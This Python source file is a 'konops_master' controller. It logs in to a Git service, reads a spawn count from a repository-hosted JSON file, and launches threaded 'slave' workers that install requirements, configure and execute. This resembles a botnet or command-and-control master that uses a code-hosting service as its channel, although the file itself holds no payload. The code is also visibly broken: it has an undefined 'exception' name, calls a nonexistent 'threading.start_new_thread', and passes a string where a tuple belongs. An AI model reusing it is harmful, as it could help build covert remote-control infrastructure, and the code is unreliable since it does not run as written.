#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@author: XCS, L0WK3Y
"""
import gitwrapper
import random
import time
import threading
import json

from konops import Konops
from konops_slave import Konops_slave



class konops_master(Konops):
    def __init__(self, master_id):
        super().__init__()
        self.master_id = master_id
        self.configured = False
        self.num_of_threads = 0
        self.spawns = 0
        self.master_config = "%s.json"%self.master_id

        self.token, self.headers = gitwrapper.login()

    def configure(self):
        config_file_path = self.cpath + self.master_config
        response, config_content_json = gitwrapper.get_file_contents(self.token, self.headers, config_file_path)

        self.configured = True

        config_file_content = json.loads(config_content_json)
        for data in config_file_content:
            self.num_of_threads = int(data['konops_spawns'])
        
        
    def spawn_konops(self, slave_id):
        try:
            konopas = Konops_slave(slave_id)
            konopas.install_requirements()
            konopas.configure()
            konopas.execute()
        except exception as e:
            print("Error spawning the konops.\n")

    def manage_konops_threads(self):
        try:
            threading.start_new_thread(self.spawn_konops, ("obsv"))
            self.spawns += 1
        except:
            print("Error starting the thread.\n")

    def run_master(self):
        while(self.spawns <= self.num_of_threads):
            self.configure()
            self.manage_konops_threads()

if __name__ == '__main__':
    master = konops_master("master")
    master.run_master()


